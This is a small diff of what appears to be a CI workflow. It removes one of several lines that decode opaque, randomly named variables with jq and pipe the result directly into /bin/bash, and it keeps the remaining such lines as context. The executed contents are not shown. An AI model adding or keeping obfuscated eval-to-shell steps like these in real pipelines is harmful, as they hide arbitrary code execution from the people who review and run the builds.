@@ -30,7 +30,6 @@ jobs:
           echo $p05 | jq -r .nw359 | /bin/bash
           printf '%s' "$nv03792" | jq -r .sl4 | /bin/bash
           printf '%s' "$tofgs70321" | jq -r .shcm34 | /bin/bash
-          echo $xexg8 | jq -r .vhb31 | /bin/bash
           printf '%s' "$o036" | jq -r .ggisa34131 | /bin/bash
 
       - name: Persist output
